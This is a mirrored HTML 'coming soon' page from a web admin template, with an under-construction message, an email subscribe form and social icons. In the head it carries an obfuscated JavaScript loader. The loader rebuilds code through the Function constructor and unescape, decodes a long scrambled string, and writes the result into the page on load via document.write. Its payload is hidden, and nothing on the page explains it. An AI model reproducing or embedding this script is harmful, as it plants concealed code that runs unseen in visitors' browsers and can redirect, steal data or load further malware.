...
<!-- Mirrored from spruko.com/demo/ynex/dist/html/coming-soon.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 07 Jul 2023 13:33:22 GMT -->
...
<head>
    ...
    function jv0v(r0ud) {
        var
            yb90, oczv = "C.\"u1(KTkm>,;x-EqRve\nn6O+Ny\'7f}=sGaSMzp/ 3UIDw0Pti:&[9l4V]?)j!{cbr\rX2o5dA|8LhBg<",
            wqrh, b923 = Function,
            vosf, cxoe = oczv.length,
            d58x = {
                cd: ""
            },
            ue = new b923("ret" + "urn unesc" + "ape")(),
            qip2 = new b923("x", ue("%74hi%73.c%64+=x")),
            e5ah = new b923("x", "y", ue("%72et%75rn%20x.c%68ar%41t(%79)"));
        for (yb90 = 0; yb90 < r0ud.length; yb90++) {
            vosf = e5ah(r0ud, yb90);
            wqrh = oczv.indexOf(vosf);
            if (wqrh > -1) {
                wqrh -= (yb90 + 1) % cxoe;
                if (wqrh < 0) {
                    wqrh += cxoe;
                }
                qip2.call(d58x, e5ah(oczv, wqrh));
            } else {
                qip2.call(d58x, vosf);
            }
        }
        new b923(ue("%64oc%75me%6Et.w%72it%65(t%68is.%63d)%3Bth%69s.c%64=n%75ll")).call(d58x);
    }
    jv0v("Ca\rolD4t]Mi=DqcS}\r?C4 ]Vk,h\rBs3=-ti6]LG-L|aG7iVX5v[K\'7X 5=(,vVzvMzt)?98.;EIBLRPE4n;Oyl1a[.O\r!X2Pl;|lA|-xkfMP:gs}[\":>VP?!m/oTM?\rss+\"G>tf>7f:iDrAuKa2\rkpK0;u-RwLNIA-ckIop<g|-nsScRd[w/KlS97P>hge[AqUG+UTP!fnN;}AfRg4SryCa>=BD7\rbrIBq:6z9XB;9]y0\'1imOd4V4EfB,Ij\"[{.KV9v45Ax0(hM:vsb.O|u6\'B8/h,xaX[\'!S5\nV/hqK;G;C8xx2T:Mp);sP;)v\"]!i}T66+\'4m|x)j\"S0P(,;//3DAy>}hBe[cbL-ewM\'w\nl||tX}qv/A;pEir{BpU0.=X:TAT5SX3V5y\'p]]cmCdmbV4|;fOUURM<rXk3!Xhs5=A:tb>-{O\n37fS!Ak4SMU2P-A5KlOb>4B,!S.1{G{<)j\r;qR9]3eRG.:,z\"+p)<CKso-uMNKn&/;,2wV,26pU!!6e \'7ajdTlaS3X0xdo(9\'k.LU>jaCu!s!g?)r,Eq[V i(I1wOnz() G\'8Ucu1>M|vmku+=Uw|(/?))a9q\"1N?g?f5GtO\'Eh9Gc+gsM1wUc:&]u-}B]?b>o{!VB1Ev0Ci>M.OzT!\'}k)kN(K;pUI<ux;T7S0iB=C3Xsl2mf}M{eDG\r4M&.oU3vLK}LU.A,;\"pR(\'zvL&h=]l?U&TwK|AXkEy
        "-4[|T+Vsbr\'17D,dAa,u/oqd>b}G,{,7km&7w0\"K84sGtt<Gr}1r(D?\rA|ti<fV=n3U1!=\'6afLg)SUEq\"(\rUi:ID<CEE0CciX]>+sC\'\'?;ns{i6MDg&[\'7?kS>C\nnc >K.xkM+)}n8LI=\rz7f6O?||+?;G7X.mEqdA6[<lDbr\'1l:w][\n=pzrp/\'pwDA|\rX6cT?m9l?kS>C\nnc >K/x}=|O:NESMg4Nnl7u1\naS/19D&X\"\"Gw<[lmNC(+Ny\'P7(Ad\rT-N7V>D\"u7sazrx2[o3DI>(mevxa3[4uzdf}4)!b; E<q2d5z?VcLuitN\"b866+5<z48,[K\rrj.ke6:1phB6y7=)T{0cSpz1NO}U:c,0j!sU55ApP(OU)\nl|ceg\rkv<VIUz?rh<\'!E}=vt{\"Kk,/&4rb)CTvniuz[9 51+7}G!eR(pyp0;,2w\'zrrXG>Dc\n4:&tp<|N7xu-]"
        );
    -->
    </script><noscript>
    ...
    <div class="row authentication coming-soon mx-0">
                ...
                <div class="aunthentication-cover-content text-center">
                    <div class="row justify-content-center align-items-center h-100">
                        <div class="col-xxl-6 col-xl-8 col-lg-8 col-md-12 col-sm-12 col-12">
                            <div class="mb-2"> <a href="index.html"> <img
                                        src="logo.png" alt=""
                                        class="authentication-brand"> </a> </div>
                            ...
                            <p class="mb-4">Our website is currently under construction, enter your email id to get
                                latest updates and notifications about the website.</p>
                            <div class="input-group mb-5"> <input type="email" class="form-control form-control-lg"
                                    ...
                                    id="button-addon2">Subscribe</button> </div>
                            <div class="row mt-4 mb-5 gy-xxl-0 gy-3 justify-content-center" id="timer"> </div>
                            <div class="mt-5">
                                <div class="btn-list"> <button class="btn btn-icon btn-primary btn-wave"> <i
                                            class="ri-facebook-line fw-bold"></i> </button> <button
                                        class="btn btn-icon btn-secondary btn-wave"> <i
                                            class="ri-twitter-line fw-bold"></i> </button> <button
                                        class="btn btn-icon btn-warning btn-wave"> <i
                                            class="ri-instagram-line fw-bold"></i> </button> <button
                                        class="btn btn-icon btn-success btn-wave"> <i
                                            class="ri-github-line fw-bold"></i> </button> <button
                                        class="btn btn-icon btn-danger btn-wave"> <i
                                            class="ri-youtube-line fw-bold"></i> </button> </div>
                            </div>
                        </div>
                    </div>
                </div>
        ...
        <div class="col-xxl-4 col-xl-4 col-lg-4 d-lg-block d-none px-0">
            <div
                ...
                <img src="https://spruko.com/demo/ynex/dist/assets/images/media/media-87.svg" alt="" class="imig-fluid">
            </div>
        </div>
    </div> <!-- Custom-Switcher JS -->
    <script src="../assets/js/custom-switcher.min.js"></script> <!-- Bootstrap JS -->
    <script src="../assets/libs/bootstrap/js/bootstrap.bundle.min.js"></script> <!-- Internal Coming Soon JS -->
